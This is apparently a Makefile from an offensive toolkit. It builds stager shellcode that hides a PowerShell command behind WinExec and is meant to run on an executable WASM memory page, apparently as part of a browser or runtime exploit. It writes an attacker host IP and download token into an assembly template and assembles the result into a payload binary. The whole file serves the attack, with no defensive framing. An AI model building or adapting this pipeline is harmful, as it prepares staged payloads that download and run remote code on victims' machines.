# Shellcode generation pipeline
#
# src/stager.asm --> bin/stager_patched.asm --> bin/final_shellcode.bin
# nasm assembles flat x64 shellcode that calls WinExec(powershell ..., 0)
# Runs in-place on the RWX WASM page — no VirtualAlloc needed.
#
# Usage:
#   make HOST_IP=<ip>    Build stager shellcode
#   make clean           Remove all generated files

HOST_IP        ?= 192.168.1.100
DOWNLOAD_TOKEN ?= PLACEHOLDER_TOKEN

SRC_DIR  = src
BIN_DIR  = bin

STAGER_SRC     = $(SRC_DIR)/stager.asm
STAGER_PATCHED = $(BIN_DIR)/stager_patched.asm
FINAL_BIN      = $(BIN_DIR)/final_shellcode.bin

.PHONY: all clean check-deps

all: check-deps $(FINAL_BIN)

# ── Dependency check ──────────────────────────────────────────────────────────

check-deps:
	@which nasm > /dev/null 2>&1 || \
	    (echo "Error: nasm not found. Install: sudo apt install nasm" && exit 1)
	@test -f $(STAGER_SRC) || (echo "Error: $(STAGER_SRC) not found" && exit 1)
	@echo "All dependencies found"

# ── Directory rule ────────────────────────────────────────────────────────────

$(BIN_DIR):
	@mkdir -p $@

# ── Stager shellcode ──────────────────────────────────────────────────────────

# Substitute HOST_IP and DOWNLOAD_TOKEN into the asm template
$(STAGER_PATCHED): $(STAGER_SRC) | $(BIN_DIR)
	@echo "[1/2] Patching HOST_IP=$(HOST_IP) and DOWNLOAD_TOKEN into stager.asm"
	sed 's/HOST_IP/$(HOST_IP)/g; s/DOWNLOAD_TOKEN/$(DOWNLOAD_TOKEN)/g' $< > $@

# Assemble to flat binary
$(FINAL_BIN): $(STAGER_PATCHED) | $(BIN_DIR)
	@echo "[2/2] Assembling stager -> bin/final_shellcode.bin"
	nasm -f bin -o $@ $<
	@echo "      Size: $$(ls -lh $@ | awk '{print $$5}')"
	@echo ""
	@echo "Build complete. Payload: $@"

# ── Utilities ─────────────────────────────────────────────────────────────────

clean:
	rm -f $(BIN_DIR)/stager_patched.asm \
	      $(BIN_DIR)/final_shellcode.bin
	@echo "Cleaned bin/"
